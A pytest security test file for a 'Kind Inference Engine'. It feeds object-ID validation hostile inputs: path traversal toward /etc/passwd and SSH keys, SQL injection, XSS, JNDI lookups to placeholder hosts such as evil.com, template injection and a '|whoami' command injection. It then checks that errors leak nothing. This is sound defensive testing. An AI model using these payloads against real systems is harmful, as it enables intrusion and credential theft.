"""Security integration tests for Kind Inference Engine.

This module tests security aspects of the Kind Inference Engine including
path traversal protection, malicious input handling, resource exhaustion
protection, and information disclosure prevention.
"""

import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from src.trellis_mcp.exceptions.validation_error import ValidationError
from src.trellis_mcp.inference.engine import KindInferenceEngine


class TestPathTraversalProtection:
    """Test protection against path traversal attacks."""

    def test_path_traversal_in_object_ids(self):
        """Test that object IDs with path traversal attempts are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Path traversal attempts in object IDs
            malicious_ids = [
                "P-../../../etc/passwd",
                "E-../../sensitive/file",
                "F-../outside/project",
                "T-../../../../root/.ssh/id_rsa",
                "P-..\\..\\windows\\system32",
                "E-./../../etc/shadow",
                "F-%2e%2e%2f%2e%2e%2fpasswd",  # URL encoded
                "T-..%252f..%252fetc%252fpasswd",  # Double URL encoded
            ]

            for malicious_id in malicious_ids:
                # Pattern matching might work (depending on validation)
                try:
                    result = engine.infer_kind(malicious_id, validate=False)
                    # Pattern should be detected correctly based on prefix
                    expected_kind = {"P": "project", "E": "epic", "F": "feature", "T": "task"}[
                        malicious_id[0]
                    ]
                    assert result == expected_kind
                except ValidationError:
                    # Some malicious IDs might be rejected at pattern level
                    pass

                # Validation should reject path traversal attempts
                with pytest.raises(ValidationError):
                    engine.infer_kind(malicious_id, validate=True)

    def test_path_traversal_in_project_root(self):
        """Test protection when project root is manipulated."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create legitimate structure
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            # Create sensitive file outside project
            sensitive_dir = temp_path.parent / "sensitive"
            sensitive_dir.mkdir(exist_ok=True)
            (sensitive_dir / "secret.txt").write_text("sensitive data")

            # Try to access outside project root
            malicious_root = temp_path / "planning" / ".." / ".." / "sensitive"

            # Engine should reject invalid project roots
            with pytest.raises(ValidationError):
                KindInferenceEngine(str(malicious_root))

    def test_symbolic_link_protection(self):
        """Test protection against symbolic link attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            # Create sensitive file
            sensitive_file = temp_path / "sensitive.txt"
            sensitive_file.write_text("sensitive information")

            try:
                # Create symbolic link in planning directory
                symlink_path = planning_dir / "projects" / "P-symlink-project"
                symlink_path.parent.mkdir(parents=True)
                symlink_path.symlink_to(sensitive_file)

                engine = KindInferenceEngine(planning_dir)

                # Should not follow symlinks to access sensitive files
                with pytest.raises(ValidationError):
                    engine.infer_kind("P-symlink-project", validate=True)

            except OSError:
                # Symlink creation might fail on some systems, skip test
                pytest.skip("Cannot create symbolic links on this system")


class TestMaliciousInputHandling:
    """Test handling of malicious input patterns."""

    def test_injection_attempts_in_object_ids(self):
        """Test handling of various injection attempts in object IDs."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Various injection attempts
            injection_attempts = [
                "P-'; DROP TABLE projects; --",
                "E-<script>alert('xss')</script>",
                "F-${jndi:ldap://malicious.com/}",
                "T-{{7*7}}",  # Template injection
                "P-\x00\x01\x02",  # Null bytes and control characters
                "E-" + "A" * 10000,  # Extremely long ID
                "F-\n\r\t",  # Newlines and control chars
                "T-|whoami",  # Command injection attempt
            ]

            for injection_id in injection_attempts:
                try:
                    # Should handle malicious input gracefully
                    result = engine.infer_kind(injection_id, validate=False)
                    # If it doesn't raise an exception, should return valid kind
                    assert result in ["project", "epic", "feature", "task"]
                except ValidationError as e:
                    # Expected for malicious inputs
                    assert len(e.errors) > 0
                    # Should not expose sensitive information in error
                    error_msg = str(e)
                    assert "DROP TABLE" not in error_msg
                    assert "<script>" not in error_msg

    def test_unicode_and_encoding_attacks(self):
        """Test handling of Unicode and encoding-based attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Unicode and encoding attacks
            unicode_attacks = [
                "P-café",  # Normal Unicode
                "E-\u202e",  # Right-to-left override
                "F-\ufeff",  # Byte order mark
                "T-\u0000",  # Null character
                "P-\u2028\u2029",  # Line/paragraph separators
                "E-🚀💣",  # Emoji
            ]

            for unicode_id in unicode_attacks:
                try:
                    result = engine.infer_kind(unicode_id, validate=False)
                    assert result in ["project", "epic", "feature", "task"]
                except ValidationError:
                    # Some Unicode patterns might be rejected
                    pass

    def test_buffer_overflow_protection(self):
        """Test protection against buffer overflow attempts."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Very long object IDs
            long_ids = [
                "P-" + "x" * 1000,
                "E-" + "y" * 5000,
                "F-" + "z" * 10000,
                "T-" + "a" * 50000,
            ]

            for long_id in long_ids:
                try:
                    result = engine.infer_kind(long_id, validate=False)
                    assert result in ["project", "epic", "feature", "task"]
                except ValidationError:
                    # Very long IDs should be rejected
                    pass
                except MemoryError:
                    pytest.fail("System should handle long strings gracefully")


class TestResourceExhaustionProtection:
    """Test protection against resource exhaustion attacks."""

    def test_cache_memory_exhaustion_protection(self):
        """Test that cache prevents memory exhaustion attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            # Small cache for testing
            engine = KindInferenceEngine(temp_path, cache_size=10)

            # Try to exhaust cache with many different IDs
            for i in range(100):
                try:
                    engine.infer_kind(f"T-exhaust-cache-{i:04d}", validate=False)
                except ValidationError:
                    pass  # Expected for non-existent objects

            # Cache should remain bounded
            stats = engine.get_cache_stats()
            assert stats["size"] <= 10
            assert stats["max_size"] == 10

    def test_concurrent_request_handling(self):
        """Test handling of many concurrent requests."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            import threading
            import time

            results = []
            errors = []

            def concurrent_worker(worker_id):
                """Worker that makes many requests."""
                start_time = time.time()
                for i in range(10):
                    try:
                        result = engine.infer_kind(f"T-worker-{worker_id}-{i}", validate=False)
                        results.append((worker_id, i, result))
                    except Exception as e:
                        errors.append((worker_id, i, e))
                end_time = time.time()
                # Each worker should complete in reasonable time
                assert (end_time - start_time) < 5.0

            # Start many concurrent workers
            threads = []
            for worker_id in range(20):
                thread = threading.Thread(target=concurrent_worker, args=[worker_id])
                threads.append(thread)
                thread.start()

            # Wait for all workers
            for thread in threads:
                thread.join()

            # Should handle concurrent load without major issues
            assert len(results) > 0
            # Some errors are expected for non-existent objects
            assert len(errors) < len(results)  # More successes than errors

    def test_infinite_loop_protection(self):
        """Test protection against patterns that could cause infinite loops."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Patterns that might cause regex issues
            problematic_patterns = [
                "P-" + "(" * 1000 + ")",  # Unbalanced parentheses
                "E-" + "*" * 100,  # Many wildcards
                "F-" + "+" * 100,  # Many plus signs
                "T-" + "?" * 100,  # Many question marks
                "P-" + ".*" * 100,  # Many .* patterns
            ]

            import time

            for pattern in problematic_patterns:
                start_time = time.time()
                try:
                    engine.infer_kind(pattern, validate=False)
                except ValidationError:
                    pass  # Expected for malformed patterns
                end_time = time.time()

                # Should complete quickly, not hang
                assert (end_time - start_time) < 1.0


class TestInformationDisclosurePrevention:
    """Test prevention of information disclosure through errors."""

    def test_error_message_sanitization(self):
        """Test that error messages don't expose sensitive information."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            # Create sensitive files
            sensitive_file = temp_path / "sensitive.txt"
            sensitive_file.write_text("password=secret123")

            engine = KindInferenceEngine(planning_dir)

            # Try to access non-existent objects
            try:
                engine.infer_kind("P-nonexistent", validate=True)
            except ValidationError as e:
                error_msg = str(e)
                # Should not expose file system paths or sensitive info
                assert "password" not in error_msg
                assert "secret123" not in error_msg
                assert (
                    str(temp_path) not in error_msg or len(str(temp_path)) < 20
                )  # Allow short paths

    def test_file_content_leakage_prevention(self):
        """Test that file content doesn't leak through error messages."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            # Create project with sensitive content
            project_dir = planning_dir / "projects" / "P-sensitive-project"
            project_dir.mkdir(parents=True)
            (project_dir / "project.md").write_text(
                """---
kind: project
id: P-sensitive-project
title: Sensitive Project
status: draft
priority: normal
created: 2025-01-01T00:00:00
updated: 2025-01-01T00:00:00
---
# Sensitive Project

This project contains sensitive information.
"""
            )

            engine = KindInferenceEngine(planning_dir)

            # Access the object - should work
            result = engine.infer_kind("P-sensitive-project", validate=True)
            assert result == "project"

            # Try to access with wrong validation
            with patch.object(engine.validator, "validate_object_structure") as mock_validator:
                from src.trellis_mcp.inference.validator import ValidationResult

                mock_validator.return_value = ValidationResult.failure(
                    errors=["File content: api_key: secret-key-12345"]
                )

                try:
                    engine.infer_kind("P-sensitive-project", validate=True)
                except ValidationError as e:
                    error_msg = str(e)
                    # Should not expose sensitive content from file
                    assert "secret-key-12345" not in error_msg
                    assert "super-secret-password" not in error_msg

    def test_system_information_leakage_prevention(self):
        """Test that system information doesn't leak through error messages."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Test various error conditions
            error_scenarios = [
                ("", "Empty ID"),
                ("INVALID", "Invalid format"),
                ("P-" + "x" * 1000, "Very long ID"),
                ("P-../../../etc/passwd", "Path traversal"),
            ]

            for invalid_id, description in error_scenarios:
                try:
                    engine.infer_kind(invalid_id, validate=True)
                except ValidationError as e:
                    error_msg = str(e)
                    # Should not expose system paths, usernames, etc.
                    assert "/home/" not in error_msg
                    assert "/Users/" not in error_msg
                    assert "Administrator" not in error_msg
                    assert "root" not in error_msg
                    # Should not expose internal implementation details
                    assert "traceback" not in error_msg.lower()
                    assert "__file__" not in error_msg


class TestSecurityIntegrationScenarios:
    """Test comprehensive security integration scenarios."""

    def test_multi_vector_attack_simulation(self):
        """Test handling of multi-vector attacks combining various techniques."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Combine multiple attack vectors
            multi_vector_attacks = [
                "P-../../../etc/passwd'; DROP TABLE projects; --",  # Path traversal + SQL injection
                "E-<script>alert('../../../etc/shadow')</script>",  # XSS + path traversal
                "F-${jndi:ldap://evil.com/../../etc/passwd}",  # JNDI + path traversal
                "T-\x00../../../etc/passwd\x00",  # Null byte + path traversal
            ]

            for attack_id in multi_vector_attacks:
                try:
                    result = engine.infer_kind(attack_id, validate=False)
                    assert result in ["project", "epic", "feature", "task"]
                except ValidationError:
                    # Expected for malicious inputs
                    pass

                # Validation should reject
                with pytest.raises(ValidationError):
                    engine.infer_kind(attack_id, validate=True)

    def test_security_under_load(self):
        """Test security measures hold up under load."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(temp_path, cache_size=50)

            import threading
            import time

            security_violations = []

            def security_test_worker(worker_id):
                """Worker that tests various security scenarios."""
                attacks = [
                    f"P-../../../worker-{worker_id}",
                    f"E-<script>worker{worker_id}</script>",
                    f"F-{{'worker': {worker_id}}}",
                    f"T-worker{worker_id}" + "x" * 100,
                ]

                for attack in attacks:
                    try:
                        start_time = time.time()
                        engine.infer_kind(attack, validate=False)
                        end_time = time.time()

                        # Should not take too long (DoS protection)
                        if (end_time - start_time) > 2.0:
                            security_violations.append(f"Slow response for {attack}")

                    except ValidationError:
                        # Expected
                        pass
                    except Exception as e:
                        # Unexpected errors might indicate security issues
                        security_violations.append(f"Unexpected error for {attack}: {e}")

            # Run concurrent security tests
            threads = []
            for worker_id in range(10):
                thread = threading.Thread(target=security_test_worker, args=[worker_id])
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            # Should not have major security violations
            assert len(security_violations) == 0, f"Security violations: {security_violations}"

    def test_audit_trail_security(self):
        """Test that audit trail doesn't expose sensitive information."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            planning_dir = temp_path / "planning"
            planning_dir.mkdir()

            engine = KindInferenceEngine(planning_dir)

            # Test various operations that might be logged
            test_operations = [
                ("P-normal-project", "project"),
                ("E-../../../etc/passwd", "epic"),
                ("F-secret-api-key-123", "feature"),
                ("T-<script>alert('xss')</script>", "task"),
            ]

            for obj_id, expected_kind in test_operations:
                try:
                    result = engine.infer_with_validation(obj_id)
                    # Results should not contain sensitive parts of input
                    assert "secret-api-key" not in str(result)
                    assert "<script>" not in str(result)
                    assert "etc/passwd" not in str(result)
                except ValidationError:
                    # Expected for malicious inputs
                    pass

            # Cache stats should not expose sensitive information
            stats = engine.get_cache_stats()
            stats_str = str(stats)
            assert "secret" not in stats_str
            assert "passwd" not in stats_str
            assert "<script>" not in stats_str
